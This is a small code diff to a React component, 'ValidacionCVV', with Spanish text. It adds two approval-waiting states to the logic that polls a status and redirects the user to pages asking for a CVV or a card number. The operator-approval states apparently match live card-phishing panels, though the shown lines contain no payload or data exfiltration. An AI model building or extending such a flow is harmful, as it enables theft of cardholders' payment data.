@@ -68,7 +68,7 @@ export default function ValidacionCVV() {
                     setPolling(false);
                     alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
                     setCvv("");
-                } else if (estado !== 'pendiente' && estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv') {
+                } else if (estado !== 'pendiente' && estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval') {
                     // Switch para manejar redirecciones específicas
                     switch (estado) {
                         case 'solicitar_tc': navigate("/validacion-tc"); break;
